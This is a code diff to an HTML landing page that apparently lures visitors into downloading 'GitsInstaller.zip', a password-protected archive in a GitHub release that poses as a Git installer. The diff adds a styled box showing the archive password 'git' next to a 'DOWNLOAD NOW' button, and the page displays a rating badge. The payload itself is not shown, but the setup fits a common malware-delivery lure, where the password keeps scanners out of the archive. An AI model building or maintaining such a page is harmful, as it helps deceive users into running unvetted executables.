@@ -225,6 +225,41 @@
             opacity: 0.7;
         }
 
+        /* Password info */
+        .password-info {
+            margin-top: 20px;
+            padding: 15px 30px;
+            background: rgba(20, 25, 60, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            border: 1px solid rgba(100, 149, 237, 0.3);
+            font-size: 1.2rem;
+            color: #a3d0ff;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .password-info i {
+            color: #6ab0ff;
+            font-size: 1.3rem;
+        }
+
+        .password-text {
+            font-weight: 600;
+        }
+
+        .password-value {
+            background: rgba(106, 176, 255, 0.2);
+            padding: 5px 12px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            color: #ffcc00;
+            border: 1px solid rgba(106, 176, 255, 0.4);
+        }
+
         /* Animation for button */
         @keyframes float {
             0% { transform: translateY(0px); }
@@ -288,6 +323,11 @@
             .auth-btn {
                 padding: 8px 15px;
                 font-size: 14px;
+            }
+            
+            .password-info {
+                font-size: 1rem;
+                padding: 12px 20px;
             }
         }
 
@@ -359,10 +399,17 @@
         
         <main class="main-content">
             <!-- Добавлен data-redirect-url для указания целевой страницы -->
-            <button class="download-btn" data-redirect-url="https://github.com/chopper7674/da/releases/download/1/GitIsntaller.zip">
+            <button class="download-btn" data-redirect-url="https://github.com/chopper7674/da/releases/download/1/GitsInstaller.zip">
                 <span class="btn-glow"></span>
                 <i class="fas fa-download"></i>DOWNLOAD NOW
             </button>
+            
+            <!-- Добавлена информация о пароле -->
+            <div class="password-info">
+                <i class="fas fa-lock"></i>
+                <span class="password-text">ZIP archive password:</span>
+                <span class="password-value">git</span>
+            </div>
             
             <div class="file-preview">
                 <h2 class="file-title">Rating: 4.7/5⭐</h2>
